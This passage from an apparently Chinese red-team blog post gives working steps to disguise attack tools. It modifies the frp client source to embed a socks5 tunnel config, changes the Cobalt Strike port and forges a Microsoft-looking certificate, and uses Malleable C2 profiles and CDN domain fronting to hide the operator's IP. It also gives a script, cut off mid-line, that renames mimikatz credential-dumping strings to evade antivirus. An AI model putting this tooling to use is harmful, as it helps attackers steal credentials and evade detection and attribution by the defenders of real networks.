title="编译方式"></a>编译方式</h3></blockquote><p>首先执行<code>make</code>会进行一些GitHub的包下载（最好使用代理</p><p>接着执行<code>make -f Makefile.cross-compiles</code>进行编译</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/8.png" alt="image-20210708143346779"></p><blockquote><h3 id="配置文件改造"><a href="#配置文件改造" class="headerlink" title="配置文件改造"></a>配置文件改造</h3></blockquote><p>全称只需要修改这个文件<code>cmd/frpc/sub/root.go</code></p><p>先修改var位置，添加ip、port、fileContent这三个参数</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">cfgFile     <span class="type">string</span></span><br><span class="line">showVersion <span class="type">bool</span></span><br><span class="line"></span><br><span class="line">serverAddr        <span class="type">string</span></span><br><span class="line">user              <span class="type">string</span></span><br><span class="line">protocol          <span class="type">string</span></span><br><span class="line">token             <span class="type">string</span></span><br><span class="line">logLevel          <span class="type">string</span></span><br><span class="line">logFile           <span class="type">string</span></span><br><span class="line">logMaxDays        <span class="type">int</span></span><br><span class="line">disableLogColor   <span class="type">bool</span></span><br><span class="line">ip                <span class="type">string</span></span><br><span class="line">port              <span class="type">string</span></span><br><span class="line">fileContent       <span class="type">string</span></span><br><span class="line">proxyName         <span class="type">string</span></span><br><span class="line">localIp           <span class="type">string</span></span><br><span class="line">localPort         <span class="type">int</span></span><br><span class="line">remotePort        <span class="type">int</span></span><br><span class="line">useEncryption     <span class="type">bool</span></span><br><span class="line">useCompression    <span class="type">bool</span></span><br><span class="line">customDomains     <span class="type">string</span></span><br><span class="line">subDomain         <span class="type">string</span></span><br><span class="line">httpUser          <span class="type">string</span></span><br><span class="line">httpPwd           <span class="type">string</span></span><br><span class="line">locations         <span class="type">string</span></span><br><span class="line">hostHeaderRewrite <span class="type">string</span></span><br><span class="line">role              <span class="type">string</span></span><br><span class="line">sk                <span class="type">string</span></span><br><span class="line">multiplexer       <span class="type">string</span></span><br><span class="line">serverName        <span class="type">string</span></span><br><span class="line">bindAddr          <span class="type">string</span></span><br><span class="line">bindPort          <span class="type">int</span></span><br><span class="line"></span><br><span class="line">kcpDoneCh <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>再修改传参位置</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">rootCmd.PersistentFlags().StringVarP(&amp;cfgFile, <span class="string">&quot;config&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;./frpc.ini&quot;</span>, <span class="string">&quot;config file of frpc&quot;</span>)</span><br><span class="line">rootCmd.PersistentFlags().BoolVarP(&amp;showVersion, <span class="string">&quot;version&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;version of frpc&quot;</span>)</span><br><span class="line">rootCmd.PersistentFlags().StringVarP(&amp;ip, <span class="string">&quot;server_addr&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;server_addr&quot;</span>)</span><br><span class="line">rootCmd.PersistentFlags().StringVarP(&amp;port, <span class="string">&quot;server_port&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;server_port&quot;</span>)</span><br><span class="line">kcpDoneCh = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后自定义一个函数</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileContent</span><span class="params">(ip <span class="type">string</span>, port <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> content <span class="type">string</span> = <span class="string">`[common]</span></span><br><span class="line"><span class="string">    server_addr = `</span> + ip + <span class="string">`</span></span><br><span class="line"><span class="string">    server_port = `</span> + port + <span class="string">`</span></span><br><span class="line"><span class="string">    tls_enable = true</span></span><br><span class="line"><span class="string">token = china_nb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[plugin_socks5]</span></span><br><span class="line"><span class="string">type = tcp</span></span><br><span class="line"><span class="string">remote_port = 12345</span></span><br><span class="line"><span class="string">plugin = socks5</span></span><br><span class="line"><span class="string">plugin_user = admin</span></span><br><span class="line"><span class="string">plugin_passwd = admin</span></span><br><span class="line"><span class="string">use_encryption = true </span></span><br><span class="line"><span class="string">use_compression = true</span></span><br><span class="line"><span class="string">    `</span></span><br><span class="line">fileContent = content</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改<code>runClient</code>函数    </p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runClient</span><span class="params">(cfgFilePath <span class="type">string</span>,ip <span class="type">string</span>,port <span class="type">string</span>)</span></span> (err <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> content <span class="type">string</span></span><br><span class="line">getFileContent(ip,port)</span><br><span class="line"><span class="comment">//scontent, err = config.GetRenderedConfFromFile(cfgFilePath)</span></span><br><span class="line">content, err = fileContent, <span class="literal">nil</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cfg, err := parseClientCommonCfg(CfgFileTypeIni, content)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(cfg.User, content, cfg.Start)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后runClient()函数下调用我们自定义的函数getFileContent()</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rootCmd = &amp;cobra.Command&#123;</span><br><span class="line">Use:   <span class="string">&quot;frpc&quot;</span>,</span><br><span class="line">Short: <span class="string">&quot;frpc is the client of frp (https://github.com/fatedier/frp)&quot;</span>,</span><br><span class="line">RunE: <span class="function"><span class="keyword">func</span><span class="params">(cmd *cobra.Command, args []<span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> showVersion &#123;</span><br><span class="line">fmt.Println(version.Full())</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Do not show command usage here.</span></span><br><span class="line">err := runClient(cfgFile,ip,port)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功结果</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/9.png" alt="image-20210708165905688"></p><h2 id="CobaltStrike改造"><a href="#CobaltStrike改造" class="headerlink" title="CobaltStrike改造"></a>CobaltStrike改造</h2><blockquote><h3 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h3></blockquote><p>编辑teamserver文件，更改<code>Dcobaltstrike.server_port</code>参数为8090</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/10.png" alt="image-20210709100449609"></p><blockquote><h3 id="修改证书特征"><a href="#修改证书特征" class="headerlink" title="修改证书特征"></a>修改证书特征</h3></blockquote><p>查看证书，密码默认的123456</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/11.png" alt="image-20210709100749504"></p><p>从图中可以看到别名、所有者、发布者都有明显的cobaltstrike特征，所以我们可以把原证书给删了，使用以下命令生成一个新的证书</p><ul><li><code>-alias</code>          指定别名</li><li><code>-storepass</code>      指定更改密钥库的存储口令</li><li><code>‐keypass pass</code>   指定更改条目的密钥口令</li><li><code>-keyalg</code>         指定算法</li><li><code>-dname</code>          指定所有者信息 </li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias Microsoft.com -dname &quot;CN=Microsoft e-Szigno Root CA, OU=e-Szigno CA, O=Microsoft Ltd., L=Budapest, S=HU, C=HU&quot; </span><br></pre></td></tr></table></figure><blockquote><h3 id="流量伪装"><a href="#流量伪装" class="headerlink" title="流量伪装"></a>流量伪装</h3></blockquote><p>通过使用项目来操作<a href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a></p><p>使用方法：<code>./teamserver [external IP] [password] [/path/to/my.profile]</code></p><p>如果我们自己编写插件的话，可以使用<code>.\c2lint [/path/to/my.profile]</code>来验证是否可以使用</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/12.png" alt="image-20210709133929402"></p><p>可以看到我们使用了插件后流量数据修改了，但是还有一个不足的点这边会显示我们的IP地址</p><blockquote><h3 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h3></blockquote><p>在上述我们修改了流量特征后发现还是会泄露我们的IP，会给防守队的溯源提供便利，所以我们可以使用CDN进行操作。由于现在的CDN需要验证域名所属了，没办法用像<code>ccc.github.com</code>、<code>ccc.apple.com</code>这种的域名了，所以本文中使用<code>a.test.com</code>作为域名讲解</p><p>首先修改我们使用的Malleable-C2-Profiles，把下图的参数都修改为<code>a.test.com</code>这个域名</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/13.png" alt="image-20210709142040450"></p><p>然后重启Cobaltstrike，在监听器中按下图进行设置</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/14.png" alt="image-20210709150735281"></p><p>然后再用该监听器生成的木马即可实现域前置</p><h2 id="mimikatz改造"><a href="#mimikatz改造" class="headerlink" title="mimikatz改造"></a>mimikatz改造</h2><p>替换关键字脚本</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com.cnpmjs.org/gentilkiwi/mimikatz.git mimikatz</span><br><span class="line"></span><br><span class="line"><span class="comment">## BASIC Strings ##</span></span><br><span class="line"></span><br><span class="line">mimi=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z&quot;</span> | <span class="built_in">fold</span> -w 8 | <span class="built_in">head</span> -n 1)</span><br><span class="line"><span class="built_in">mv</span> windows/mimikatz windows/<span class="variable">$mimi</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/mimikatz/<span class="variable">$mimi</span>/g&quot;</span></span><br><span class="line">MIMI=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;A-Z&quot;</span> | <span class="built_in">fold</span> -w 8 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/MIMIKATZ/<span class="variable">$MIMI</span>/g&quot;</span></span><br><span class="line">Mimi=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z&quot;</span> | <span class="built_in">fold</span> -w 8 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/Mimikatz/<span class="variable">$Mimi</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 5 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/DELPY/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 8 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/Benjamin/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 23 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/benjamin@gentilkiwi.com/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 15 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/creativecommons/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 10 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/gentilkiwi/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z&quot;</span> | <span class="built_in">fold</span> -w 4 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/KIWI/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z&quot;</span> | <span class="built_in">fold</span> -w 4 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/Kiwi/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">kiwi=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z&quot;</span> | <span class="built_in">fold</span> -w 4 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/kiwi/<span class="variable">$kiwi</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 13 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/A La Vie, A L/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 24 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/vincent.letoux@gmail.com/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 8 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/benjamin/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 14 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/Benjamin DELPY/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 5 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/oe.eo/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 14 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/pingcastle.com/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 16 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/mysmartlogon.com/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line">string=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&quot;a-zA-Z0-9&quot;</span> | <span class="built_in">fold</span> -w 15 | <span class="built_in">head</span> -n 1)</span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/Vincent LE TOUX/<span class="variable">$string</span>/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Basic Function Names ##</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/logonPasswords/loGoNpASSwoRdS/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/dpapi/dPApi/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/sekurlsa/seKuRlSa/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/sekurLSA/seKuRlSa/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ngc/nGc/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/lsadump/lsADumP/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/crypto/cRyPTO/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/kerberos/kErberoS/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/token/tOKEn/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/misc/mIsC/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/minesweeper/mInesWeEpEr/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/vault/vAULt/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/privilege/PRIViLeGe/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/process/ProCeSs/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/busylight/bUsYlIght/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/sr98/sR98/g&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Sub-function Names ##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sekurlsa #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/msv/mSv/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/wdigest/wDiGeST/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/tspkg/tsPkG/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/livessp/liVeSsP/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/cloudap/clOuDAp/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ssp/sSp/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/logonpasswords/loGonPaSSworDs/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/minidump/mIniDumP/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/bootkey/bOOtKey/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/pth/ptH/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/krbtgt/krbTgT/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/backupkeys/backUpKeyS/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/tickets/ticKets/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ekeys/eKeYs/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/credman/crEdMan/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/tickets/ticKets/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ekeys/eKeYs/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Crypto #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/providers/prOviDers/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/certificates/certIfiCatEs/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/scauth/sCaUth/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/extract/exTraCt/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dpapi #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/masterkey/masTerKeY/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/credhist/crEdHiSt/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/cloudapkd/clOudApKd/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/cloudapreg/clOuDapReg/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># kerberos #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/golden/golDen/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ptt/pTt/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/clist/cLiSt/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lsadump #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/secrets/seCrEts/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/sam/saM/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/dcshadow/dCShAdoW/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/dcsync/dCsYnC/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/setntlm/seTnTlM/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/netsync/neTSynC/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/cache/caCHe/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># misc #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/regedit/reGeDit/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/skeleton/sKeLeToN/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/easyntlmchall/easYnTlmChaLl/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ncroutemon/nCroUTeMoN/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/taskmgr/taSkMgR/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/aadcookie/aAdcOoKiE/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># vault #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/cred/crEd/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># token #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/elevate/eleVatE/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/revert/reVeRt/g&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Replace file names ##</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -name <span class="string">&quot;*mimikatz*&quot;</span> | <span class="keyword">while</span> <span class="built_in">read</span> FILE ; <span class="keyword">do</span></span><br><span class="line">newfile=<span class="string">&quot;<span class="subst">$(echo $&#123;FILE&#125; |sed -e <span class="string">&quot;s/mimikatz/<span class="variable">$mimi</span>/g&quot;</span>)</span>&quot;</span>;</span><br><span class="line"><span class="built_in">mv</span> <span class="string">&quot;<span class="variable">$&#123;FILE&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;newfile&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -name <span class="string">&quot;*kiwi*&quot;</span> | <span class="keyword">while</span> <span class="built_in">read</span> FILE ; <span class="keyword">do</span></span><br><span class="line">newfile=<span class="string">&quot;<span class="subst">$(echo $&#123;FILE&#125; |sed -e <span class="string">&quot;s/kiwi/<span class="variable">$kiwi</span>/g&quot;</span>)</span>&quot;</span>;</span><br><span class="line"><span class="built_in">mv</span> <span class="string">&quot;<span class="variable">$&#123;FILE&#125;</span>&quot;</span> <span class="string">&quot;<span 